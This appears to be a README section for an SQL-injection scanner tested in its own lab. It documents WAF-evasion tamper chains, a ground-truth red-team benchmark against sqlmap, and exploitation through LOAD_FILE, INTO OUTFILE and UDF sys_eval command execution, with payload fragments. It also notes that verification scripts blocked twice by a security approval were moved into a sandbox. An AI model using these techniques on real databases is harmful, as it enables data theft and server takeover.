
**自动路径（不显式配 tamper）实测 11 技术位，反超人工挂链基线 10**（`npm run waf-auto`）：
引擎自行识别拦截证据 → 链验证选中 `['dash2hash','hexliterals']`（日志 `WAF 链验证：[dash2hash,hexliterals] 探针放行`）
→ 重跑补全。三项关键使能修复：

1. **重跑前重探闭合前缀**：主轮 boundary 探测的 payload 不带 tamper，CRS 下被 942460 拦光 →
   回退空串 → 重跑探针无引号闭合（`alice AND 1=1#` 落进字符串字面量）→ 真假双双空结果 → 门控失败。
   重跑已带 tamper，重探即得正确 `'`（实测 `重探闭合前缀："" → "'"`）。
2. **重跑候选纳入「已命中但快速层技术位不全」的点**：主轮只中 boolean 的点原本被判「已命中」而排除，
   union 面永远补不上。
3. **链验证只认硬拦截**：原判据含「响应体缩水 50% = 软拦截」，而 payload 生效后结果集本就变空/变短
   （如恒空页的 `/blind`）→ 每条链都被误判失败 → 重跑整轮跳过。

另：`off` 档须同时关掉 `adaptiveOnBlock`，否则不再是「无规避基线」（A/B 会串味）。

### 红队实战评测（ground-truth 真值对照）

`e2e/redteam-lab/` 是一套**带地面真值的实战评测**：26 个靶点（19 个真实漏洞点 + 7 个安全对照），
覆盖数值/字符串/LIKE/ORDER BY/报错/布尔/时间/POST/JSON/Cookie/Header/Path/Base64/二阶/堆叠/WAF 守卫。

```bash
npm run lab:redteam     # 拉起环境（MySQL + PG + 靶场，同进程常驻）
npm run redteam:truth   # 用已知 payload 重建地面真值（selftest）
npm run redteam:r2      # 调参口径扫描（level 3 / risk 2 / 全技术）
npm run redteam:report  # 汇总（含 sqlmap 同题对照）
```

**实测（2026-09-12，真 MySQL 8.0.28）**：

| 口径 | 检出 | 说明 |
|---|---|---|
| R1 开箱即用（level 1） | 18/19（95%） | 唯一漏项是 Cookie 点——level 1 不测 Cookie，**与 sqlmap 的默认行为一致** |
| R2 调参（level 3） | **19/19（100%）** | 全中 |
| 安全对照（7 个安全点） | **误报 0** | 参数化/随机/500/403/重定向/静态资源 |

### sqlmap 同题对照（当期实测）

```bash
npm run redteam:sqlmap   # 14 个漏洞用例 + 4 个安全用例，--level 1 --risk 1（与本工具 R1 档对齐）
```

| 指标 | sqli-scanner R1 | sqlmap（同档 level 1） | 口径说明 |
|---|---|---|---|
| 漏洞检出 | 18/19（95%） | 13/14（93%） | **分母不同**：sqlmap 用例未覆盖 D11-cookie / D14-D16 / E15 |
| 安全点误报 | **0/7（0%）** | 3/4（75%） | **分母不同**：sqlmap 只跑 4 个安全用例（F18/F20/F21/F22） |

sqlmap 误报的具体条目：`F18-safe-item`、`F20-safe-rand`、`F21-safe-500` 被判为注入；
`F22-safe-403` 未误报。本工具 7 个安全点（含 F19/F23/F24）全部零误报。

⚠️ 这不是严格同题对比（用例数量不同），**比率不可直接类比**；但「安全点误报 0 vs 3」是
方向性差异，且可复现（两条命令都能跑）。调参后本工具 R2 为 19/19（100%）。

已作为 `redteam` 套件纳入 `npm run acceptance`（需先起靶场；CI 里起不来则按 SKIP 处理，不假绿）。

### 验收门禁（`npm run acceptance`）

11 套件一次跑完：服务端单测 → 独立刁钻靶场 → 检测回归 → 真 MySQL → 真 PG（含二阶）→
**报告契约** → CRS 人工挂链 A/B → CRS 自动选链 → 红队实战（真值对照）→ fileRead/fileWrite 真闭环。

**判定纪律（关键）**：门禁**不采信任何套件自报的 PASS 字样**，只解析可独立核对的事实数字
（漏洞场景数 / 安全误报数 / 技术位 / 文件是否真的存在），据此断言并决定退出码。

制定这条纪律的原因：项目曾出现五类缺陷，全部位于**组件接缝**处，共同病征是
「中间层自报成功、无人校验外部事实」——`wrote:true` 但文件不存在、探针发出但无闭合、
靶场存在却因硬编码端口跑不起来。**覆盖率不等于有效性**。

```bash
npm run acceptance                  # 全量（约 8 分钟）
npm run acceptance -- --skip-heavy  # 跳过最慢的 CRS 组
npm run acceptance -- --only=waf-auto,waf-real   # 改完某模块做定向门禁
```

- 依赖缺失时输出 **SKIP + 原因**（不静默跳过、不假装通过）；任一必需套件失败 → 非零退出码。
- 报告落盘 `e2e/results/acceptance-report.md`。

**最近一次全量结果（2026-09-17，MySQL 8.0.28 `secure_file_priv=''` 放行实例 + 红队靶场就绪）**：**11 PASS / 0 FAIL / 0 SKIP**

| 套件 | 事实 |
|---|---|
| 服务端单测 | 1838 tests / 1835 pass / 0 fail / 3 skip（skip 为环境依赖显式跳过） |
| 独立刁钻靶场 | 10/10 检出，安全误报 0 |
| 检测回归 | 19 PASS / 0 FAIL |
| 真 MySQL / 真 PG（含二阶） | 10 PASS / 全部通过 |
| 报告契约 | 8 项一致 / 0 不一致 |
| CRS 人工挂链 / 自动选链 | off 2 → on 10；技术位 10，误报 0 |
| 红队实战评测（真值对照） | 19/19（100%），安全点 7，误报 0 |
| fileRead / fileWrite | **PASS**（放行实例下；fileWrite 含文件系统侧落盘断言） |

- 门禁本身做过**缺陷注入验证**：临时移除有效 tamper 链后，`waf-auto` 套件精准 FAIL
  （技术位 10 → 2），恢复后回到 PASS。
- **[2026-09-17] 门禁自身两处缺陷已修**（修复前它会给出错误结论，属于「门禁不可信」级别）：
  1. 单测套件断言写的是 `pass === tests`，与「允许环境依赖 skip」自相矛盾 → **只要存在 skip 就恒判 FAIL**
     （实测 1838 tests / 1835 pass / 0 fail / 3 skip 被判失败，原因打印「断言未通过」）。
     改为 `pass + skipped === tests && fail === 0`。**门禁假红比没有门禁更糟**：团队会习惯性
     忽略它，真失败也随之被淹没。
  2. `pre` 里的键是驼峰 `secureFilePriv`，而 `SUITES[].needs` 写的是 `'secure_file_priv'` →
     `!pre['secure_file_priv']` 恒为 true → redteam / file-read / file-write **无论 MySQL 怎么配
     都被 SKIP**（门禁声称「因环境跳过」，实为键名拼错，这三项能力从未被门禁验证过）。
     修复后三者首次真跑即 PASS。判据同时改为 `s !== null && s !== undefined`
     （MySQL 语义：`NULL`=禁止导入导出、`''`=不限制、`/path`=限定目录，后两者都算放行；
     用真值语义会把完全放行的 `''` 误判成未放行，与事实正好相反）。
- **[2026-09-17] 新增一键扫描专项 e2e**：`node e2e/one-click/one-click-scan.e2e.mjs`，
  33 条断言全 PASS。真实 PGlite 靶场 + **独立子进程**跑 `scripts/one-click-scan.mjs`，
  覆盖主路径（5 格式+manifest 落盘 / 退出码 2 / 交付五要素字段）、四格式字段一致性、
  退出码语义（安全目标→0）、参数矩阵（POST JSON / `-r` 导入 / `--formats` 子集 / `--quiet`）、
  边界（缺目标→1、非法格式→1）、安全边界（SSRF 严格层 / 云元数据硬底线 / scope 越界）。

### 利用能力实测口径（2026-09-10 起）

| 能力 | 状态 | 依据 |
|---|---|---|
| **fileRead（MySQL）** | ✅ **已跑通真实闭环** | HTTP 注入点 → UNION 注入 → `LOAD_FILE` → 内容回传，与自备标记文件**逐字节一致**。复现：`npm run e2e:file-read` |
| **fileWrite（MySQL）** | ✅ **已跑通真实闭环** | HTTP 注入点 → `INTO OUTFILE` → **文件系统侧确认落盘**（含注入标记）。复现：`npm run e2e:file-write` |
| **UDF / os-shell** | ✅ **已跑通真实闭环**（隔离沙箱内） | HTTP 注入点 → `CREATE FUNCTION ... SONAME` 注册 → `sys_eval` 执行命令 → 输出回传，与标记**逐字符一致**；`mysql.func` 表独立复核。复现：`python e2e/udf-lab/sandbox.py --script udf-takeover.e2e.mjs --allow-command-exec` |
| 注册表 | ⚠️ 实验特性，未真实验证 | 仍只有 mock 单测 |

**UDF 接管：验证环境与边界（2026-09-18 起，如实说明，勿夸大）**

历史上两个验证脚本连续两轮被环境安全审批拦截。现改为在 **`e2e/udf-lab/` 内的隔离
MySQL 实例**中运行 —— 既让验证可自动化，又把风险面从本机收窄到「用完即毁的实例」：

```
e2e/udf-lab/
  udf_sys.c              最小 UDF：udf_echo(s) 原样返回 + sys_eval(cmd) 执行并返回 stdout
  build-udf.py           MSVC x64 构建（显式 INCLUDE/LIB/PATH，不依赖 vcvars/reg.exe）
  mysql_sandbox.py       隔离 MySQL 实例：独立 datadir + 端口 3308 + secure_file_priv/plugin_dir
                         双锁在沙箱内；--verify-isolation-ephemeral 实测越权写入被拒
                         my-sandbox.ini **由本脚本自动生成**（--print-ini 可只读预览），
                         不依赖磁盘遗留文件 —— 修复了「新克隆/CI 上 --init 因缺配置直接失败」
  sandbox.py             沙箱执行器：起隔离实例 → 跑验证脚本 → 必停；进程/写入/出站三重白名单
  _sandbox_node_guard.cjs  Node 侧守卫（--require 预加载）：真实拦截 node 内越权动作
  udf_direct_probe.py    直连基线：DLL 落地 → 注册 → 调用 → 回传（不经注入通道）
  udf-register.e2e.mjs   经注入通道：注册 + 调用（不含命令执行）
  udf-takeover.e2e.mjs   经注入通道：注册 + sys_eval 执行命令 + Exploiter.osShell
```

实测结果（2026-09-18）：

| 验证项 | 结果 | 外部事实源 |
|---|---|---|
| 沙箱隔离边界 | ✅ PASS 5/5 | 越权写入 `C:\Windows\Temp` 被 `ERROR 1290` 拒绝（真跑，非断言） |
| 沙箱负向拦截 | ✅ PASS 7/7 | powershell/危险 cmd/越权写/外网连接全被拦；白名单内命令放行 |
| UDF 直连基线 | ✅ PASS 6/6 | `mysql.func` 计数 + 回传值等于传入标记 |
| `udf-register` | ✅ PASS | 注入链路✅ 直连✅，回传值双向一致 |
| `udf-takeover` | ✅ PASS | `sys_eval('cmd /c echo ...')` 输出 == 标记；`whoami` 返回真实身份；`Exploiter.osShell` → `{ok:true}` |

**沙箱能力边界（必须如实告知，实测得出）**：

1. **Python 审计钩子不穿透进程边界** —— 钩子只在自身进程生效，被测 node 进程内部
   起的子进程对它不可见。故 node 侧另有 `--require` 预加载的守卫负责真实拦截。
2. **「写文件被拦」不等于沙箱能力** —— 部分拦截来自 Windows 自身权限（实测 `C:/` 根目录
   写入返回 `EPERM`）。凡引用此类证据必须标注来源。
3. 本沙箱定位是「**受控执行 + 取证**」，不是对抗恶意代码的强隔离容器。真实隔离边界由
   **隔离 MySQL 实例**提供（脚本能破坏的最大范围 = 那个用完即毁的 datadir）。
4. 仍未复现的环节：**经 SQL 通道投递 DLL 本体**。DLL hex 约 24 万字符，远超 Node 的
   URL/header 上限（16KB）；走 POST body 也需目标放宽限制（Express json 默认 100kb）。
   故 `udf-takeover` 采用「库文件已落地」前提，只验证**注册与执行**链路。
   实际接管通常靠精简体积的 UDF 库或配合已有文件写权限。

**fileWrite 两条投递通道（`via` 字段如实标注）**：

| 通道 | 触发条件 | 特点 |
|---|---|---|
| `stacked` | 目标支持多语句（堆叠注入） | 写入内容即投递内容，最干净 |
| `union` | 目标仅 UNION 注入（无堆叠） | `UNION SELECT '<content>',NULL... INTO OUTFILE`；**写入的是查询结果集**——文件首行可能含原查询数据（实测落盘内容含原表行 + 注入行） |

> 旧实现只走堆叠通道：在仅 UNION 的目标上第二条语句不会执行，但 HTTP 响应仍为 200 →
> 旧实现据此返回 `{wrote:true, verified:false}`，**文件从未落盘**（实测文件系统确认不存在）。
> 现增加 UNION 回落 + `via` 标注，并在未落地时返回 `ok:false`（`wrote` 仅表示请求已发出）。

**硬前提（必须如实告知客户）**：MySQL 的 `fileRead` 同时需要
① 账号具备 `FILE` 权限；② **`secure_file_priv` 放行**。
MySQL 8 **默认 `secure_file_priv=NULL`（彻底禁用）**——实测默认实例下 `fileRead` 返回
`{ ok:false, value:null }`，即**该能力在生产默认配置下不可用**，属合规的安全默认值。
仅当目标管理员显式放行（`secure_file_priv=''` 或指定目录）时才可能成功。

真实 ModSecurity/Coraza（含 libinjection）与商业云 WAF 未实测，上述数字仅在自实现执行器口径内成立。
复现：`MYSQL_PORT=3306 node e2e/waf-real/waf-verify.mjs`（人工挂链 A/B）与
`node e2e/waf-real/waf-auto-check.mjs`（自动路径验收）。
- 直连模式（对标 sqlmap -d）：支持 SQLite 直连（sql.js）+ 真实驱动注册接口（mysql2/pg/mssql/oracle 等需用户自备）

## 贡献

详见 [CONTRIBUTING.md](CONTRIBUTING.md) — 包含项目结构、开发环境、代码规范、引擎架构要点和提交规范。